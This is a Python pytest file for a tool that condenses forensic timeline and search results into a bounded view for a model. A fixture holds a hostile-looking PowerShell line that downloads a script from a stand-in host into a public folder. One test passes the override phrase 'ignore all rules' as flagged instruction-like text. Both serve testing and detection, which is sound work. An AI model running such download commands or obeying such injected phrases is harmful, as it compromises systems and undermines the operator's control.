"""The compact row view (core/tool_result_view.render_rows_view) and the
row vocabulary behind it (core/table_rows): what the model reads of a
result's row list, within the limit, honest about what it shows. Fixtures
are invented (CORP-WS01, jane.doe, files.example.net, 203.0.113.x, 2031)."""
from __future__ import annotations

import inspect
import json
import re

import pytest

from core import table_rows as T
from core.tool_result_view import ROW_VIEW_TOOLS, _NEXT_HINTS, render_rows_view

LIMITS = (12000, 8000, 2500, 500)
CONTROL = ("success", "gate", "matched_rows", "valid_zero", "hit_cap_reached", "scan_capped")
FORBIDDEN = ("output_path", "output_file", "csv_path", "json_path", "produced", "produced_files",
             "artifact_paths", "files_written", "truncated", "incomplete", "wall_clock_timed_out")


def _timeline_rows(n_routine=26, burst=True):
    rows = []
    for d in range(1, n_routine + 1):
        rows.append({"_sheet": "-", "_row": d, "_matched_columns": ["desc"],
                     "date": f"01/{d:02d}/2031", "time": "03:00:01", "timezone": "UTC", "MACB": "M...",
                     "source": "EVT", "sourcetype": "WinEVTX", "type": "Content Modification Time",
                     "user": "-", "host": "CORP-WS01", "short": "[4688 / 0x1250] updater-task.exe",
                     "desc": "[4688 / 0x1250] A new process has been created: updater-task.exe /scheduled " + "x" * 400,
                     "version": "2", "filename": "OS:/mnt/ws01/C/Windows/System32/winevt/Logs/Security.evtx",
                     "inode": "-", "notes": "-", "format": "winevtx", "extra": "xml_string: <Event/>"})
    if burst:
        rows.insert(13, {**rows[12], "_row": 101, "time": "23:12:04", "source": "LOG",
                         "sourcetype": "PowerShell Transcript Event", "user": "jane.doe",
                         "short": "PS>Invoke-WebRequest",
                         "desc": "PS>Invoke-WebRequest -Uri http://files.example.net/u.ps1 -OutFile C:\\Users\\Public\\u.ps1",
                         "filename": "OS:/mnt/ws01/C/Users/jane.doe/Documents/PowerShell_transcript.CORP-WS01.txt",
                         "format": "text"})
        rows.insert(14, {**rows[12], "_row": 102, "time": "23:12:40", "source": "FILE", "sourcetype": "Bodyfile",
                         "type": "Creation Time", "short": "c:\\Users\\Public\\u.ps1",
                         "desc": "c:\\Users\\Public\\u.ps1 Owner identifier: 0 Mode: r/rrwxrwxrwx",
                         "filename": "OS:/mnt/ws01/C/$MFT", "format": "bodyfile"})
    return rows


def _payload(rows, pattern=r"updater-task\.exe|files\.example\.net|u\.ps1|203\.0\.113\.7", **extra):
    return {"success": True, "path": "evidence/timelines/corp-ws01-supertimeline.csv", "pattern": pattern,
            "hits": rows, "hit_count": len(rows), "max_hits": 50, "hit_cap_reached": False,
            "rows_scanned": 1204331, "scanned_rows": 1204331, "scan_capped": False, **extra}


def _view(payload, limit=12000, tool="table_table_grep", call_id=4711, notes=None):
    out = render_rows_view(payload, limit, call_id, notes, tool=tool)
    assert out is not None
    text, note = out
    return text, json.loads(text), note


@pytest.mark.parametrize("limit", LIMITS)
def test_the_contract_holds_at_every_limit(limit):
    payload = _payload(_timeline_rows(), brain_wiki=["x" * 300], message="a note",
                       alternatives={"matched": [r"updater-task\.exe"], "unmatched": []})
    out = render_rows_view(payload, limit, 4711, ["max_hits coerced to 50"], tool="table_table_grep")
    if limit < 2500:
        # The header alone, or the header with no row, passes the bound:
        # the plain path keeps the result readable.
        assert out is None
        return
    assert out is not None
    text, note = out
    assert note["view_rows_shown"] >= 1
    assert len(text) <= limit
    data = json.loads(text)
    assert list(data)[:2] == ["_atlas_call_id", "success"] and data["_atlas_call_id"] == 4711
    for key in CONTROL:
        if key in payload:
            assert data[key] == payload[key], key
    assert not any(k in data for k in FORBIDDEN)
    assert "hits" not in data and "alternatives" not in data
    if limit >= 8000:   # at tighter limits the header keeps only the control keys
        assert data["omitted_keys"] == ["brain_wiki"] and data["message"] == "a note"
        assert data["_arguments_adjusted"] == ["max_hits coerced to 50"]
    assert note["view_rows_returned"] == len(payload["hits"])
    assert note["view_rows_shown"] == len(note["view_row_ids"]) or note["view_rows_shown"] >= len(note["view_row_ids"])


def test_the_rare_rows_are_in_view_and_the_routine_collapses():
    text, data, note = _view(_payload(_timeline_rows()))
    rows = data["rows"]
    assert any("files.example.net" in r for r in rows) and any("u.ps1 Owner" in r for r in rows)
    assert any(r.startswith("#1-#13 x13 ") and "every 1d" in r for r in rows)
    assert data["same_in_every_returned_row"] == {"timezone": "UTC", "host": "CORP-WS01"}
    assert data["columns"].startswith("time | source/sourcetype | ")
    assert data["shown"] == "all 28 matching rows, listed oldest first; window: none"
    assert data["terms_with_no_row"] == [r"203\.0\.113\.7"]
    assert note["view_complete"] is True and set(note["view_terms_shown"]) == {
        r"updater-task\.exe", r"files\.example\.net", r"u\.ps1"}
    assert note["view_row_ids"][:3] == [1, 2, 3] and 101 in note["view_row_ids"]
    assert "next" not in data


def test_the_distribution_names_the_day_that_stands_out_by_sources_not_rows():
    text, data, _note = _view(_payload(_timeline_rows()))
    dist = data["distribution"]
    assert dist[0].startswith("28 rows 2031-01-01 03:00:01 .. 2031-01-26 03:00:01 (all matching rows)")
    assert dist[1].startswith("day that stands out: 2031-01-13 (3 rows; most distinct sources and terms")
    assert dist[2].startswith("per day: 2031-01-01 1, ")
    assert re.search(r"\b2031-01-13 3\b", dist[2]) and "01-13 3" in dist[2]
    # Source lines rarest first; the routine source says on how many days.
    assert dist[3].startswith("source FILE/Bodyfile: 1 row 2031-01-13 23:12:40")
    assert dist[4].startswith("source LOG/PowerShell Transcript Event: 1 row")
    assert dist[5].startswith("source EVT/WinEVTX: 26 rows 2031-01-01 03:00:01 .. 2031-01-26 03:00:01, on 26 days")
    assert data["terms"][0].startswith(r"updater-task\.exe: 26 rows 2031-01-01 03:00:01..2031-01-26 03:00:01, on 26 days (EVT/WinEVTX 26)")


def test_no_day_stands_out_when_the_spread_is_even():
    rows = _timeline_rows(burst=False)
    text, data, _ = _view(_payload(rows, pattern=r"updater-task\.exe"))
    assert data["distribution"][1] == "no day stands out: 26 days, median 1 rows per day"
    assert "terms" not in data


def test_a_capped_result_is_honest_about_what_its_rows_are():
    rows = _timeline_rows()
    capped = _payload(rows, hit_cap_reached=True, alternatives={
        "matched": [r"updater-task\.exe", r"files\.example\.net", r"u\.ps1"], "unmatched": [r"203\.0\.113\.7"]})
    text, data, note = _view(capped)
    assert data["shown"].startswith("all 28 returned rows; the 28 are the first matching rows in file order, "
                                    "where the search stopped, not a sample of the whole file; "
                                    "how many rows match in all is not known")
    assert data["distribution"][0].endswith("(the returned rows only)")
    assert data["terms_with_no_row"] == [r"203\.0\.113\.7"] and "terms_not_settled" not in data
    # The calls that show the rest (a period, one term); paging and a
    # file of every row are not offered.
    assert data["next"] == "one period: time_start=/time_end=; one term alone: pattern=<term>"
    assert note["view_complete"] is False
    # A matched term without a returned row is not absent, and not shown.
    matched_only = _payload(rows[:5], hit_cap_reached=True, alternatives={
        "matched": [r"updater-task\.exe", r"u\.ps1"], "unmatched": [r"203\.0\.113\.7"]})
    _t, data, note = _view(matched_only)
    assert data["terms_matched_not_returned"] == [r"u\.ps1"]
    assert data["terms_with_no_row"] == [r"203\.0\.113\.7"]
    assert data["terms_not_settled"] == 1   # files.example.net: neither matched nor unmatched
    assert note["view_terms_shown"] == [r"updater-task\.exe"]
    # Without a block nothing is settled: a count, no names.
    _t, data, _n = _view(_payload(rows[:5], hit_cap_reached=True))
    assert "terms_with_no_row" not in data and data["terms_not_settled"] == 3


def test_a_capped_result_with_no_narrower_call_leaves_next_out(monkeypatch):
    """One term and no period parameter: nothing narrower to offer, so the
    view has no next key rather than an empty one."""
    monkeypatch.setenv("ATLAS_TABLE_TIME_ARGS", "0")
    text, data, _n = _view(_payload(_timeline_rows(), pattern=r"updater-task\.exe", hit_cap_reached=True))
    assert "next" not in data and '"next"' not in text


def test_a_scan_capped_result_settles_no_term():
    rows = _timeline_rows()[:5]
    _t, data, _n = _view(_payload(rows, scan_capped=True, hit_cap_reached=False,
                                  alternatives={"matched": [r"updater-task\.exe"], "unmatched": [r"u\.ps1"]}))
    assert "terms_with_no_row" not in data and data["terms_not_settled"] == 3
    assert "the scan stopped at its row bound" in data["shown"]
    assert data["next"]


def test_a_count_above_the_returned_rows_is_a_cut_without_any_flag():
    """The view reads the cut from the counts, not from a tool's flag: a
    result that says more rows match than it returned, with neither
    hit_cap_reached nor payload_capped, says N of M, never "all", and names
    the narrower calls, though every returned row fits."""
    rows = _timeline_rows()
    n = len(rows)
    payload = {"success": True, "path": "evidence/timelines/corp-ws01-supertimeline.csv", "matched_rows": 201,
               "returned_rows": n, "offset": 0, "rows": rows, "scan_capped": False}
    text, data, note = _view(payload, limit=200_000, tool="table_table_query")
    assert note["view_rows_shown"] == n and note["view_complete"] is False
    assert data["shown"].startswith(f"{n} of 201 matching rows ({n} returned: rows 1 to {n} of the 201")
    assert f"all {n} matching rows" not in text
    assert data["next"]


def test_a_view_with_no_row_is_declined():
    """At a bound where the header fits but no row does, a view of no row
    shows less than the plain cut text, so the view declines."""
    payload = _payload(_timeline_rows(), brain_wiki=["x" * 300], message="a note")
    assert render_rows_view(payload, 768, 4711, tool="table_table_grep") is None


def test_the_view_leaves_refusals_zero_rows_other_tools_and_the_switch_off_alone(monkeypatch):
    rows = _timeline_rows()
    assert render_rows_view({"success": False, "gate": "unknown_columns", "hits": rows}, 12000, 1,
                            tool="table_table_grep") is None
    assert render_rows_view(_payload([]), 12000, 1, tool="table_table_grep") is None
    assert render_rows_view(_payload(rows), 12000, 1, tool="yara_scan") is None
    monkeypatch.setenv("ATLAS_RESULT_VIEW", "0")
    assert render_rows_view(_payload(rows), 12000, 1, tool="table_table_grep") is None
    monkeypatch.setenv("ATLAS_RESULT_VIEW", "1")
    monkeypatch.setenv("ATLAS_RESULT_DISTRIBUTION", "0")
    _t, data, _n = _view(_payload(rows))
    assert "distribution" not in data and data["terms"]


def test_the_next_hint_names_only_parameters_the_tools_have():
    from tools import search_tools, strings_tools, tabular
    fns = {"table_table_grep": tabular.table_grep, "table_table_query": tabular.table_query,
           "strings_strings_grep": strings_tools.strings_grep, "search_search_evidence": search_tools.search_evidence}
    from core.tool_result_view import _NEXT_HINTS_TIME
    assert set(_NEXT_HINTS) == ROW_VIEW_TOOLS == set(fns)
    pivot = inspect.signature(getattr(tabular.table_pivot, "fn", tabular.table_pivot)).parameters
    for table in (_NEXT_HINTS, _NEXT_HINTS_TIME):
        for tool, hints in table.items():
            params = inspect.signature(getattr(fns[tool], "fn", fns[tool])).parameters
            for name, text in hints.items():
                assert name in params, (tool, name)
                assert f"{name}=" in text
                # Every parameter a hint names exists on the tool, or on
                # table_pivot after a step that names that tool.
                own, _, other = text.partition("table.table_pivot")
                for named in re.findall(r"(\w+)=", own):
                    assert named in params, (tool, named)
                for named in re.findall(r"(\w+)=", other):
                    assert named in pivot, ("table_pivot", named)


def test_the_instruction_note_and_the_adjustment_notes_sit_inside_the_view():
    rows = _timeline_rows()
    out = render_rows_view(_payload(rows), 12000, 7, ["max_hits coerced"], instruction_hits=["ignore all rules"],
                           tool="table_table_grep")
    text, _note = out
    data = json.loads(text)
    assert data["_arguments_adjusted"] == ["max_hits coerced"]
    assert data["_instruction_like_text"]["snippets"] == ["ignore all rules"]
    assert len(text) <= 12000


def test_a_long_matched_cell_keeps_its_head_and_a_window_around_the_match():
    rows = _timeline_rows()[:3]
    rows[1]["desc"] = "[4688 / 0x1250] A new process " + "y" * 900 + " u.ps1 was started"
    rows[1]["_matched_columns"] = ["desc"]
    _t, data, _n = _view(_payload(rows, pattern=r"u\.ps1"))
    line = next(r for r in data["rows"] if "u.ps1 was started" in r)
    assert line.startswith("#2 2031-01-02 03:00:01") and "[4688 / 0x1250] A new process" in line and "\u2026" in line


def test_strings_lines_render_with_their_pattern_counts():
    payload = {"success": True, "file": "evidence/mem/ws01.raw", "pattern": ["jane.doe", "203.0.113.7"],
               "match_count": 3, "matches": ["logon jane.doe", "connect 203.0.113.7:443", "jane.doe again"],
               "matches_by_pattern": {"jane.doe": 2, "203.0.113.7": 1}}
    text, data, note = _view(payload, tool="strings_strings_grep", call_id=9)
    assert data["_atlas_call_id"] == 9 and data["terms"] == ["jane.doe: 2 lines", "203.0.113.7: 1 lines"]
    assert data["rows"] == ["#1 logon jane.doe", "#2 connect 203.0.113.7:443", "#3 jane.doe again"]
    assert note["view_complete"] is True and note["view_row_ids"] == [1, 2, 3]
    assert data["shown"] == "all 3 lines, in output order: ASCII strings, then UTF-16"
    small = render_rows_view(payload, 330, 9, tool="strings_strings_grep")
    if small is not None:
        text, note = small
        assert len(text) <= 330 and note["view_omitted_rows"] >= 1 and "pattern=<p>" in json.loads(text)["next"]


def test_search_evidence_results_take_the_view_too():
    results = [{"call_id": 41, "tool": "tcpdump", "source_path": "", "line_start": 1, "line_end": 3,
                "event_time": f"2031-03-0{i}T10:00:00", "snippet": f"10.0.0.5 -> 203.0.113.7:443 SYN {i}"}
               for i in range(1, 6)]
    payload = {"success": True, "query": "203.0.113.7", "results": results, "result_count": 5}
    text, data, note = _view(payload, tool="search_search_evidence", call_id=12)
    assert data["_atlas_call_id"] == 12 and len(data["rows"]) == 5 and note["view_complete"] is True
    assert data["rows"][0].startswith("#1 2031-03-01 10:00:00")


def test_a_search_that_fills_its_limit_is_not_complete():
    """A search cut at max_results may have more matches behind it; the view
    must not call its rows all there are."""
    results = [{"call_id": 41, "tool": "tcpdump", "source_path": "", "line_start": i, "line_end": i,
                "event_time": f"2031-03-0{i}T10:00:00", "snippet": f"203.0.113.7 SYN {i}"} for i in range(1, 6)]
    payload = {"success": True, "query": "203.0.113.7", "results": results, "result_count": 5,
               "hit_cap_reached": True}
    _t, data, note = _view(payload, tool="search_search_evidence", call_id=12)
    assert note["view_complete"] is False
    assert "matching rows, listed" not in data["shown"] and "is not known" in data["shown"]


def test_the_timeline_readers_accept_the_same_files_as_before(tmp_path):
    """The shared time list picks a column once a reader accepted the file;
    it does not widen which files a reader accepts."""
    from plugins.timeline_builder.mapper.readers import reader_for_path
    for name, header, accepted in (
        ("pecmd_out.csv", "SourceFilename,ExecutableName,RunCount,LastRun", None),
        ("notes.csv", "Date,Time,Note", None),
        ("ioc_list.csv", "ip,date", None),
        ("evtx.csv", "RecordNumber,TimeCreated,EventId,Computer", "EvtxCsvReader"),
        ("sessions.csv", "StartDate,UserName,ClientAddress", "TimestampedCsvReader"),
    ):
        p = tmp_path / name
        p.write_text(header + "\n" + ",".join("x" for _ in header.split(",")) + "\n")
        reader = reader_for_path(p)
        assert (reader.__name__ if reader else None) == accepted, name


def test_time_columns_agree_between_the_profile_and_the_timeline_readers(tmp_path):
    from core.coverage import profile_tabular
    from core.cross_source_reconciliation import _row_time
    from plugins.timeline_builder.mapper.readers import _pick_time
    for header, rows, column, first in (
        ("date,time,timezone,source,host", ["03/04/2031,10:16:00,UTC,LOG,CORP-WS01", "03/05/2031,09:00:00,UTC,LOG,CORP-WS01"],
         "date+time", "2031-03-04T10:16:00"),
        ("RecordNumber,TimeCreated,EventId,Computer", ["1,2031-03-04 10:16:00,4624,CORP-WS01", "2,2031-03-05 09:00:00,4624,CORP-WS01"],
         "TimeCreated", "2031-03-04 10:16:00"),
    ):
        p = tmp_path / "t.csv"
        p.write_text(header + "\n" + "\n".join(rows) + "\n")
        prof = profile_tabular(str(p))
        assert prof["time_column"] == column and prof["time_min"] == first
        row = dict(zip(header.split(","), rows[0].split(",")))
        assert _pick_time(row) == first.replace("T", " ")
        assert _row_time(row) == first.replace("T", " ")


def test_select_anchors_the_rare_term_and_the_rare_source_before_the_spread():
    n = 40
    times = [f"2031-01-{(i % 28) + 1:02d} 10:00:00" for i in range(n)]
    tsets = [{0} for _ in range(n)]
    tsets[17] = {0, 1}                       # the rare term's one row
    groups = ["routine"] * n
    groups[33] = "rare-source"
    chosen = T.select(n, times, tsets, groups, 8, 2)
    idx = {i for _t, i in chosen}
    assert 17 in idx and 33 in idx and len(idx) == 8
    tiers = {i: t for t, i in chosen}
    assert tiers[17] == 1 and tiers[33] == 2 and sum(1 for t in tiers.values() if t == 4) >= 3


def test_a_cut_result_compacted_to_its_artifacts_keeps_its_stamp(tmp_path):
    from core.tool_result_view import maybe_compact_rendered
    art = tmp_path / "out.csv"
    art.write_text("a,b\n1,2\n", encoding="utf-8")
    cut = '{\n  "_atlas_call_id": 57,\n  "truncated": true,\n  "output_path": "' + str(art) + '",\n  "stdout": "x'
    out = json.loads(maybe_compact_rendered(cut))
    assert next(iter(out)) == "_atlas_call_id" and out["_atlas_call_id"] == 57 and out["gate"] == "artifact_ready"
